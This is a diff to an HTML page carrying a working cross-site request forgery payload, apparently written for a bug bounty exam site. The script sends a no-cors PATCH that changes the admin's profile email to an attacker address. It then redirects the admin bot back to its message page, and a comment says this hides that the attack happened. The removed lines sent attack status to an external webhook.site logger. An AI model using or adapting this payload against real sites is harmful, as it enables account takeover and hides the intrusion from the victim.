@@ -2,25 +2,22 @@
 <html>
 <body>
     <script>
+        const msgId = "69e16464bee6d6b7c6627539";
         const target = "https://api-bugbounty-exam.hashacademy.co/api/auth/profile";
-        const logger = "https://webhook.site/841a65c5-0695-459d-80da-91ae7613c283";
-
-        // 1. Log that the bot is executing the attack
-        fetch(logger + "?status=executing_payload");
-
-        // 2. The PATCH request to change Admin's email
+        
+        // 1. Perform the Attack (Change Email)
         fetch(target, {
             method: "PATCH",
-            mode: "no-cors", 
-            headers: {
-                "Content-Type": "text/plain" 
-            },
+            mode: "no-cors",
+            headers: { "Content-Type": "text/plain" },
             body: JSON.stringify({
                 "fullName": "Admin Pwned",
                 "email": "rundlady@gongjua.com"
             })
         }).then(() => {
-            fetch(logger + "?status=attack_finished");
+            // 2. IMMEDIATELY send the bot back to the message page
+            // This makes it look like the bot never left!
+            window.location.href = "https://bugbounty-exam.hashacademy.co/admin/messages/" + msgId;
         });
     </script>
 </body>
